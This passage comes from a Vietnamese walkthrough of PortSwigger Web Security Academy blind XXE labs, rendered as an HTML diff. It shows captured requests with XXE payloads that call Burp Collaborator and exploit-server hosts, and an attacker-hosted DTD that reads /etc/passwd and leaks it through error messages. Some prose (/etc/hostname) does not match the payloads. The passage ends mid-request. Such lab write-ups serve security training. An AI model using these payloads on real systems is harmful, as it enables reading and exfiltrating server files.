+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="o">&lt;?</span><span class="nx">xml</span><span class="w"> </span><span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nx">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span><span class="o">?&gt;&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">xxe</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;http://8fokbdx541qzf9p3fy5c46fsejka822qr.oastify.com&quot;</span><span class="o">&gt;</span><span class="w"> </span><span class="o">%</span><span class="nx">xxe</span><span class="p">;]</span><span class="o">&gt;</span><span class="p">&lt;</span><span class="nt">stockCheck</span><span class="p">&gt;&lt;</span><span class="nt">productId</span><span class="p">&gt;</span><span class="mf">1</span><span class="p">&lt;/</span><span class="nt">productId</span><span class="p">&gt;&lt;</span><span class="nt">storeId</span><span class="p">&gt;</span><span class="mf">1</span><span class="p">&lt;/</span><span class="nt">storeId</span><span class="p">&gt;&lt;/</span><span class="nt">stockCheck</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi request trên. Nhận thấy đã trigger thành công Burp collab. Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2014.png" /></p>
+<p><img alt="image.png" src="image%2015.png" /></p>
+</li>
+</ul>
+<h1 id="lab-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd"><strong>Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD</strong><a class="headerlink" href="#lab-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration">Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện chọn một sản phẩm bất kỳ. Điều hướng đến chức năng <code>Check stock</code></p>
+<p><img alt="image.png" src="image%2016.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API <code>POST /product/stock</code> . Thực hiện thêm entity sau. Quan sát khi gửi request đi thì có trigger burp collab nên có thể dùng oob</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">xxe</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;http://x86942quxqjo8yis8ny1xv8h78dz1rwfl.oastify.com&quot;</span><span class="o">&gt;</span><span class="w"> </span><span class="o">%</span><span class="nx">xxe</span><span class="p">;]</span><span class="o">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">product</span><span class="o">/</span><span class="nx">stock</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">ac900b4040020dac916896200d700f0</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">ebJRb6wybHKuLWbAXiTl5vBzjuytn9Yg</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="o">*</span><span class="err">/*</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0ac900b4040020dac916896200d700f0.web-security-academy.net/product?productId=1</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">208</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0ac900b4040020dac916896200d700f0.web-security-academy.net</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nx">empty</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">cors</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="o">&lt;?</span><span class="nx">xml</span><span class="w"> </span><span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nx">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span><span class="o">?&gt;&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">xxe</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;http://x86942quxqjo8yis8ny1xv8h78dz1rwfl.oastify.com&quot;</span><span class="o">&gt;</span><span class="w"> </span><span class="o">%</span><span class="nx">xxe</span><span class="p">;]</span><span class="o">&gt;</span><span class="p">&lt;</span><span class="nt">stockCheck</span><span class="p">&gt;&lt;</span><span class="nt">productId</span><span class="p">&gt;</span><span class="mf">1</span><span class="p">&lt;/</span><span class="nt">productId</span><span class="p">&gt;&lt;</span><span class="nt">storeId</span><span class="p">&gt;</span><span class="mf">1</span><span class="p">&lt;/</span><span class="nt">storeId</span><span class="p">&gt;&lt;/</span><span class="nt">stockCheck</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2017.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Để thực hiện đọc file, chúng ta có thể tạo ra một external dtd rồi gọi dtd đó. Tuy nhiên vì blind based nên chúng ta không thể thấy gì render trên màn hình.</p>
+<ul>
+<li>
+<p>External DTD dựng trên server của attacker</p>
+<ul>
+<li>
+<p>Head</p>
+<div class="highlight"><pre><span></span><code><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span><span class="w"> </span><span class="mf">200</span><span class="w"> </span><span class="nx">OK</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="w"> </span><span class="nx">charset</span><span class="o">=</span><span class="nx">utf</span><span class="o">-</span><span class="mf">8</span>
+</code></pre></div>
+</li>
+<li>
+<p>Body</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;file:///etc/passwd&quot;</span><span class="o">&gt;</span>
+<span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nb">eval</span><span class="w"> </span><span class="s2">&quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;file:///nonexistent/%file;&#39;&gt;&quot;</span><span class="o">&gt;</span>
+<span class="o">%</span><span class="nb">eval</span><span class="p">;</span>
+<span class="o">%</span><span class="nx">error</span><span class="p">;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Config</p>
+<p><img alt="image.png" src="image%2018.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Trong request gửi tới API <code>POST /product/stock</code> thực hiện gọi file dtd như sau:</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">xxe</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;http://exploit-0ab80098047d20b3c94f883701530072.exploit-server.net/exploit.dtd&quot;</span><span class="o">&gt;</span><span class="w"> </span><span class="o">%</span><span class="nx">xxe</span><span class="p">;]</span><span class="o">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">product</span><span class="o">/</span><span class="nx">stock</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">ac900b4040020dac916896200d700f0</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">ebJRb6wybHKuLWbAXiTl5vBzjuytn9Yg</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="o">*</span><span class="err">/*</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0ac900b4040020dac916896200d700f0.web-security-academy.net/product?productId=1</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">234</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0ac900b4040020dac916896200d700f0.web-security-academy.net</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nx">empty</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">cors</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="o">&lt;?</span><span class="nx">xml</span><span class="w"> </span><span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nx">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span><span class="o">?&gt;&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">xxe</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;http://exploit-0ab80098047d20b3c94f883701530072.exploit-server.net/exploit.dtd&quot;</span><span class="o">&gt;</span><span class="w"> </span><span class="o">%</span><span class="nx">xxe</span><span class="p">;]</span><span class="o">&gt;</span><span class="p">&lt;</span><span class="nt">stockCheck</span><span class="p">&gt;&lt;</span><span class="nt">productId</span><span class="p">&gt;</span><span class="mf">1</span><span class="p">&lt;/</span><span class="nt">productId</span><span class="p">&gt;&lt;</span><span class="nt">storeId</span><span class="p">&gt;</span><span class="mf">1</span><span class="p">&lt;/</span><span class="nt">storeId</span><span class="p">&gt;&lt;/</span><span class="nt">stockCheck</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi request trên, quan sát nội dung file <code>/etc/hostname</code> được trả về trong request tới Burp collab. Hoặc là chúng ta có thể dùng exploit server và nhận ở đó cũng được</p>
+<ul>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2019.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2020.png" /></p>
+</li>
+</ul>
+<h1 id="lab-exploiting-blind-xxe-to-retrieve-data-via-error-messages"><strong>Lab: Exploiting blind XXE to retrieve data via error messages</strong><a class="headerlink" href="#lab-exploiting-blind-xxe-to-retrieve-data-via-error-messages" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages">Lab: Exploiting blind XXE to retrieve data via error messages | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện chọn một sản phẩm bất kỳ. Điều hướng đến chức năng <code>Check stock</code></p>
+<p><img alt="image.png" src="image%2021.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API <code>POST /product/stock</code> . Tại đây, thực hiện truyền payload sau. Nhận thấy trigger thành công đến Burp collab ⇒ có OOB. Ngoài ra có lỗi hiển thị trên response ⇒ có thể dùng error base vì oob thường khó chứa ký tự đặc biệt nếu không encode</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">xxe</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;http://n6uz2sokvghe6ogi6dwrvl675ybpzhw5l.oastify.com&quot;</span><span class="o">&gt;</span><span class="w"> </span><span class="o">%</span><span class="nx">xxe</span><span class="p">;]</span><span class="o">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">product</span><span class="o">/</span><span class="nx">stock</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a2500fe03c41f3a80c4173400b40050</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">KyRTUf5iGEUZtqiiDHfXfjumqWwZNWt9</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="o">*</span><span class="err">/*</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a2500fe03c41f3a80c4173400b40050.web-security-academy.net/product?productId=1</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">208</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a2500fe03c41f3a80c4173400b40050.web-security-academy.net</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nx">empty</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">cors</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="o">&lt;?</span><span class="nx">xml</span><span class="w"> </span><span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nx">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span><span class="o">?&gt;&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">xxe</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;http://n6uz2sokvghe6ogi6dwrvl675ybpzhw5l.oastify.com&quot;</span><span class="o">&gt;</span><span class="w"> </span><span class="o">%</span><span class="nx">xxe</span><span class="p">;]</span><span class="o">&gt;</span><span class="p">&lt;</span><span class="nt">stockCheck</span><span class="p">&gt;&lt;</span><span class="nt">productId</span><span class="p">&gt;</span><span class="mf">1</span><span class="p">&lt;/</span><span class="nt">productId</span><span class="p">&gt;&lt;</span><span class="nt">storeId</span><span class="p">&gt;</span><span class="mf">1</span><span class="p">&lt;/</span><span class="nt">storeId</span><span class="p">&gt;&lt;/</span><span class="nt">stockCheck</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2022.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện tạo một external entity ở server của chúng ta như sau để trigger lỗi. Cụ thể, <code>% file</code> sẽ lấy được nội dung sau đó thì <code>% eval</code> tạo một thực thể chứa khai báo thực thể khác. Khi đó nếu gọi <code>% eval</code> xong thì <code>% error</code> được khai báo. Tiếp đến gọi <code>% error</code> thì sẽ trigger lỗi và render trong response.</p>
+<ul>
+<li>
+<p>Header</p>
+<div class="highlight"><pre><span></span><code><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span><span class="w"> </span><span class="mf">200</span><span class="w"> </span><span class="nx">OK</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="w"> </span><span class="nx">charset</span><span class="o">=</span><span class="nx">utf</span><span class="o">-</span><span class="mf">8</span>
+</code></pre></div>
+</li>
+<li>
+<p>Body</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;file:///etc/passwd&quot;</span><span class="o">&gt;</span>
+<span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nb">eval</span><span class="w"> </span><span class="s2">&quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;file:///nonexistent/%file;&#39;&gt;&quot;</span><span class="o">&gt;</span>
+<span class="o">%</span><span class="nb">eval</span><span class="p">;</span>
+<span class="o">%</span><span class="nx">error</span><span class="p">;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Config</p>
+<p><img alt="image.png" src="image%2023.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gọi đến file dtd của attack bằng cách sau:</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">xxe</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;http://exploit-0a8800ba03941f2580531623014500c7.exploit-server.net/exploit.dtd&quot;</span><span class="o">&gt;</span><span class="w"> </span><span class="o">%</span><span class="nx">xxe</span><span class="p">;]</span><span class="o">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">product</span><span class="o">/</span><span class="nx">stock</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a2500fe03c41f3a80c4173400b40050</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">KyRTUf5iGEUZtqiiDHfXfjumqWwZNWt9</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="o">*</span><span class="err">/*</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a2500fe03c41f3a80c4173400b40050.web-security-academy.net/product?productId=1</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">234</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a2500fe03c41f3a80c4173400b40050.web-security-academy.net</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nx">empty</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">cors</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="o">&lt;?</span><span class="nx">xml</span><span class="w"> </span><span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nx">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span><span class="o">?&gt;&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">xxe</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;http://exploit-0a8800ba03941f2580531623014500c7.exploit-server.net/exploit.dtd&quot;</span><span class="o">&gt;</span><span class="w"> </span><span class="o">%</span><span class="nx">xxe</span><span class="p">;]</span><span class="o">&gt;</span><span class="p">&lt;</span><span class="nt">stockCheck</span><span class="p">&gt;&lt;</span><span class="nt">productId</span><span class="p">&gt;</span><span class="mf">1</span><span class="p">&lt;/</span><span class="nt">productId</span><span class="p">&gt;&lt;</span><span class="nt">storeId</span><span 